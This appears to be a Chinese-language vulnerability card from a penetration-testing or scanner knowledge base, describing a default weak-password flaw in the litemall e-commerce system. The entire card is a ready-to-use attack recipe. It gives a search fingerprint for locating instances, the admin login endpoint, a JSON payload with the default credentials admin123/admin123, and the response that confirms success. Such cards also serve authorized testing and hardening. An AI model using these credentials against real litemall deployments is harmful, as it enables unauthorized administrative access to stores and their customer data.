# litemall系统默认弱口令漏洞

litemall ｜ 默认口令 ｜ —
- **指纹**：`title="litemall"`
- **请求**：`POST /admin/auth/login HTTP/1.1`

**Payload**
```
{"username":"admin123","password":"admin123"}
```
- **响应特征**：200 adminInfo